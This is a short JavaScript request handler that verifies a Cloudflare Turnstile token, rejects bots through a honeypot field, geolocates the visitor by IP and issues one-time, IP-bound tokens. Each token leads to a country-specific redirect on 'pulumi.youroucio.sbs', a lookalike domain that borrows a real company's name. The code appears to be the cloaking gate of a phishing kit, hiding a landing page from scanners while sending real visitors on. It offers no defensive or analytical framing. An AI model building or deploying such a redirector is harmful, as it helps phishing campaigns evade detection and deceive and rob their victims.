const tokenStore = new Map();

const geoRedirects = {
  'US': 'https://pulumi.youroucio.sbs/e1Qj!IgwR/us',  // Redirect for US users
  'IN': 'https://pulumi.youroucio.sbs/e1Qj!IgwR/in',  // Redirect for India users
  'EU': 'https://pulumi.youroucio.sbs/e1Qj!IgwR/eu',  // Redirect for EU users
  'default': 'https://pulumi.youroucio.sbs/e1Qj!IgwR/global'  // Default fallback URL
};

// Example function to get user geo-location from IP using ip-api
const getUserGeo = async (ip) => {
  const response = await fetch(`http://ip-api.com/json/${ip}`);
  const data = await response.json();
  return data.countryCode; // This will return 'US', 'IN', 'EU', etc.
};

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { token, honeypot } = req.body;

  // Honeypot field check (bots will fill this out)
  if (honeypot && honeypot !== "") {
    return res.status(400).json({ success: false, error: "Bot detected." });
  }

  const secret = process.env.TURNSTILE_SECRET;

  const verifyResponse = await fetch(
    "https://challenges.cloudflare.com/turnstile/v0/siteverify",
    {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `secret=${secret}&response=${token}`
    }
  );

  const data = await verifyResponse.json();

  if (!data.success) {
    return res.status(400).json({ success: false });
  }

  // Geo-location detection based on user's IP
  const userGeo = await getUserGeo(req.headers['x-forwarded-for'] || req.connection.remoteAddress); 

  // Generate unique token (JWT-style)
  const uniqueToken = Math.random().toString(36).substring(2, 12);

  // Store token with geo-location and IP binding
  tokenStore.set(uniqueToken, {
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    geo: userGeo,
    createdAt: Date.now(),
    url: geoRedirects[userGeo] || geoRedirects['default'] // Use geo-based redirect or default
  });

  return res.status(200).json({
    success: true,
    redirectUrl: `/api/r/${uniqueToken}`
  });
}

export { tokenStore };
